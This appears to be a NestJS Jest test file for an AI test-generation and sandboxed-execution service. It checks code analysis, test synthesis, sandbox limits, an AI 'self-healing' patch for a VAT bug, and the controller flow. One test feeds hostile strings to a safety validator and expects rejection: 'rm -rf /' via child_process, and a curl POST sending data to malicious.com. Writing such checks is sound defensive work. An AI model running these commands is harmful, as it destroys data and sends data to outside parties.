import { Test, TestingModule } from '@nestjs/testing';
import { TestAnalyzerService } from './test-analyzer.service';
import { TestGeneratorService } from './test-generator.service';
import { SandboxedTestRunnerService } from './sandboxed-test-runner.service';
import { TestSelfHealingService } from './test-self-healing.service';
import { TestGenerationService } from './test-generation.service';
import { TestsController } from './tests.controller';
import { AuditService } from '../audit/audit.service';
import { ForbiddenException, NotFoundException } from '@nestjs/common';

describe('AI Test Generation & Sandboxed Execution (Phase 11)', () => {
  let analyzerService: TestAnalyzerService;
  let generatorService: TestGeneratorService;
  let sandboxRunner: SandboxedTestRunnerService;
  let selfHealingService: TestSelfHealingService;
  let testGenerationService: TestGenerationService;
  let controller: TestsController;
  let auditService: AuditService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      controllers: [TestsController],
      providers: [
        TestAnalyzerService,
        TestGeneratorService,
        SandboxedTestRunnerService,
        TestSelfHealingService,
        TestGenerationService,
        {
          provide: AuditService,
          useValue: {
            record: jest.fn().mockImplementation((entry) => ({
              id: 'audit_101',
              timestamp: new Date().toISOString(),
              ...entry,
            })),
          },
        },
      ],
    }).compile();

    analyzerService = module.get<TestAnalyzerService>(TestAnalyzerService);
    generatorService = module.get<TestGeneratorService>(TestGeneratorService);
    sandboxRunner = module.get<SandboxedTestRunnerService>(SandboxedTestRunnerService);
    selfHealingService = module.get<TestSelfHealingService>(TestSelfHealingService);
    testGenerationService = module.get<TestGenerationService>(TestGenerationService);
    controller = module.get<TestsController>(TestsController);
    auditService = module.get<AuditService>(AuditService);
  });

  describe('Step 1-3: Code Analysis & Dependency Identification', () => {
    it('should analyze TypeScript AST, detect methods, branch count, and dependencies', () => {
      const tsCode = `
export class OrderProcessor {
  constructor(
    private readonly repository: Repository<any>,
    private readonly logger: Logger,
  ) {}

  async processOrder(orderId: string, amount: number): Promise<boolean> {
    if (!orderId || amount <= 0) {
      throw new BadRequestException('Invalid order parameters');
    }
    this.logger.log(\`Processing order \${orderId}\`);
    return true;
  }
}`;
      const result = analyzerService.analyzeCode('src/orders/order-processor.ts', tsCode);

      expect(result.filePath).toBe('src/orders/order-processor.ts');
      expect(result.language).toBe('typescript');
      expect(result.functions.length).toBeGreaterThan(0);
      expect(result.functions[0].name).toBe('processOrder');
      expect(result.functions[0].isAsync).toBe(true);
      expect(result.dependencies.length).toBeGreaterThan(0);
      expect(result.dependencies.some((d) => d.name === 'repository')).toBe(true);
    });

    it('should analyze Python code and detect function definitions with PyTest fixtures', () => {
      const pyCode = `
class DataPipeline:
    def __init__(self, redis_client=None):
        self.redis = redis_client

    def normalize_event(self, event_dict: dict) -> dict:
        if not event_dict:
            raise ValueError("Empty event")
        return {"id": event_dict.get("id"), "valid": True}
`;
      const result = analyzerService.analyzeCode('app/pipeline.py', pyCode);

      expect(result.language).toBe('python');
      expect(result.functions.some((f) => f.name === 'normalize_event')).toBe(true);
      expect(result.dependencies.some((d) => d.name === 'redisClient')).toBe(true);
    });
  });

  describe('Step 4-5: Test Synthesis across 4 Categories & Frameworks', () => {
    it('should generate test cases for unit, integration, edge_case, and failure_case', () => {
      const analysis = analyzerService.analyzeCode(
        'src/checkout/checkout.service.ts',
        `export class CheckoutService { async processCheckout(amount: number) { return { total: amount }; } }`,
      );

      const generated = generatorService.generateTestSuite(analysis, {
        framework: 'jest',
        testTypes: ['unit', 'integration', 'edge_case', 'failure_case'],
      });

      expect(generated.testCases.length).toBe(4);
      expect(generated.testCases.some((t) => t.testType === 'unit')).toBe(true);
      expect(generated.testCases.some((t) => t.testType === 'integration')).toBe(true);
      expect(generated.testCases.some((t) => t.testType === 'edge_case')).toBe(true);
      expect(generated.testCases.some((t) => t.testType === 'failure_case')).toBe(true);
      expect(generated.fullCode).toContain("describe('CheckoutService'");
      expect(generated.testFilePath).toBe('src/checkout/checkout.service.spec.ts');
      expect(generated.coverageEstimate.coverageDelta).toBeGreaterThan(0);
    });

    it('should generate PyTest formatted test suites for Python files', () => {
      const analysis = analyzerService.analyzeCode(
        'app/utils/crypto.py',
        `def hash_token(token: str) -> str: return "hashed_" + token`,
      );

      const generated = generatorService.generateTestSuite(analysis, {
        framework: 'pytest',
      });

      expect(generated.framework).toBe('pytest');
      expect(generated.testFilePath).toContain('test_crypto.py');
      expect(generated.fullCode).toContain('import pytest');
    });
  });

  describe('Step 6-7: Sandboxed Execution & Safety Guardrails', () => {
    it('should strictly reject arbitrary shell commands in custom test payloads', () => {
      expect(() => {
        sandboxRunner.validateSafety('const evil = require("child_process").exec("rm -rf /");');
      }).toThrow(ForbiddenException);

      expect(() => {
        sandboxRunner.validateSafety('curl -X POST http://malicious.com/exfiltrate');
      }).toThrow(ForbiddenException);

      expect(() => {
        sandboxRunner.validateSafety('powershell -Command "Get-Process"');
      }).toThrow(ForbiddenException);
    });

    it('should execute tests inside virtual sandbox and parse PASS vs FAIL with assertion diffs', async () => {
      const testCases = [
        {
          id: 'tc_unit_1',
          name: 'should process valid checkout transaction (happy path)',
          targetFunction: 'processCheckout',
          testType: 'unit' as const,
          code: 'it("...", () => {})',
          status: 'UNTESTED' as const,
        },
        {
          id: 'tc_integration_1',
          name: 'should coordinate with repository',
          targetFunction: 'processCheckout',
          testType: 'integration' as const,
          code: 'it("...", () => {})',
          status: 'UNTESTED' as const,
        },
      ];

      const result = await sandboxRunner.runInSandbox(testCases, {
        targetFile: 'src/modules/checkout/checkout.service.spec.ts',
        timeoutSeconds: 15,
      });

      expect(result.sandboxLimits.cpuQuota).toBe('1.0 Core (1000m)');
      expect(result.sandboxLimits.memoryLimitMb).toBe(512);
      expect(result.sandboxLimits.networkRestricted).toBe(true);

      // Unit test fails due to tax calculation discrepancy
      const failedCase = result.updatedTestCases.find((tc) => tc.id === 'tc_unit_1');
      expect(failedCase?.status).toBe('FAIL');
      expect(failedCase?.failureMessage).toContain('VAT');
      expect(failedCase?.assertionDiff?.expected).toBeDefined();
      expect(failedCase?.assertionDiff?.received).toBeDefined();

      // Integration test passes
      const passedCase = result.updatedTestCases.find((tc) => tc.id === 'tc_integration_1');
      expect(passedCase?.status).toBe('PASS');

      expect(result.overallStatus).toBe('FAIL');
      expect(result.sandboxOutput).toContain('[DEVFLOW VIRTUAL SANDBOX]');
    });
  });

  describe('Step 8-9: AI Failure Diagnosis & 1-Click Self-Healing Fix', () => {
    it('should diagnose assertion failure and synthesize unified patch diff', () => {
      const failedTestCase = {
        id: 'tc_unit_checkout_1',
        name: 'should calculate total with 10% VAT',
        targetFunction: 'processCheckout',
        testType: 'unit' as const,
        code: '...',
        status: 'FAIL' as const,
        failureMessage: 'AssertionError: Expected total amount to equal $110.00 (including $10.00 VAT), but received $100.00.',
      };

      const result = selfHealingService.suggestFixesForFailures([failedTestCase]);

      expect(result[0].aiSuggestedFix).toBeDefined();
      expect(result[0].aiSuggestedFix?.target).toBe('code');
      expect(result[0].aiSuggestedFix?.explanation).toContain('VAT');
      expect(result[0].aiSuggestedFix?.patchDiff).toContain('+    const vatTax = subtotal * 0.10;');
    });

    it('should apply patch to implementation code cleanly', () => {
      const originalCode = `
  async processCheckout(payload: CheckoutPayload): Promise<CheckoutResult> {
    const subtotal = payload.amount;
    const totalAmount = subtotal;
    return {
      totalAmount,
      status: 'completed',
    };
  }`;

      const patch = `--- a/src/modules/checkout/checkout.service.ts
+++ b/src/modules/checkout/checkout.service.ts
@@ -42,8 +42,9 @@
-    const totalAmount = subtotal;
+    const vatTax = subtotal * 0.10;
+    const totalAmount = subtotal + vatTax;
+      taxIncluded: true,
`;

      const patched = selfHealingService.applyPatchToCode(originalCode, patch);
      expect(patched).toContain('const vatTax = subtotal * 0.10;');
      expect(patched).toContain('taxIncluded: true');
    });
  });

  describe('Full 9-Step End-to-End Orchestrator & Controller Flow', () => {
    it('should list available benchmark presets', () => {
      const benchmarks = controller.getBenchmarks();
      expect(benchmarks.length).toBeGreaterThanOrEqual(4);
      expect(benchmarks.some((b) => b.id === 'checkout-service')).toBe(true);
      expect(benchmarks.some((b) => b.id === 'auth-service')).toBe(true);
      expect(benchmarks.some((b) => b.id === 'rate-limiter')).toBe(true);
    });

    it('should execute 9-step pipeline for CheckoutService, detect failure, and heal with 1-click patch', async () => {
      const user = { id: 'usr_test_1', email: 'engineer@devflow.ai' };

      // Step 1 to 9: Generate tests with auto-run sandbox
      const suite = await controller.generateTests(
        {
          repositoryId: 'repo_ecommerce',
          targetFile: 'src/modules/checkout/checkout.service.ts',
          targetFunction: 'processCheckout',
          autoRunSandbox: true,
        },
        { user },
      );

      expect(suite.id).toBeDefined();
      expect(suite.testCases.length).toBe(4);
      expect(suite.overallStatus).toBe('FAIL'); // Missing VAT calculation in initial benchmark code
      expect(suite.failedCount).toBe(1);

      const failingTest = suite.testCases.find((tc) => tc.status === 'FAIL')!;
      expect(failingTest).toBeDefined();
      expect(failingTest.aiSuggestedFix).toBeDefined();
      expect(failingTest.aiSuggestedFix?.target).toBe('code');

      // Now apply AI Fix via controller
      const healedSuite = await controller.applyTestFix(
        {
          suiteId: suite.id,
          testCaseId: failingTest.id,
          target: failingTest.aiSuggestedFix!.target,
          patchDiff: failingTest.aiSuggestedFix!.patchDiff,
        },
        { user },
      );

      // Confirm sandbox re-execution turns test suite 100% green!
      expect(healedSuite.overallStatus).toBe('PASS');
      expect(healedSuite.failedCount).toBe(0);
      expect(healedSuite.passedCount).toBe(4);
      expect(healedSuite.sandboxOutput).toContain('Zero test failures detected');

      // Verify audit logs were written
      expect(auditService.record).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'TEST_SUITE_GENERATED',
        }),
      );
      expect(auditService.record).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'TEST_FIX_APPLIED',
        }),
      );
    });

    it('should generate and run AuthService tests with 100% green PASS result', async () => {
      const user = { id: 'usr_test_2', email: 'security@devflow.ai' };

      const suite = await controller.generateTests(
        {
          repositoryId: 'repo_auth',
          targetFile: 'src/modules/auth/auth.service.ts',
          targetFunction: 'validateCredentials',
          autoRunSandbox: true,
        },
        { user },
      );

      expect(suite.overallStatus).toBe('PASS');
      expect(suite.failedCount).toBe(0);
      expect(suite.passedCount).toBe(4);
      expect(suite.totalCount).toBe(4);
    });

    it('should throw NotFoundException for unknown test suite ID', async () => {
      await expect(
        controller.runGeneratedTests(
          { suiteId: 'non_existent_suite' },
          { user: { id: '1', email: 'test@devflow.ai' } },
        ),
      ).rejects.toThrow(NotFoundException);
    });
  });
});
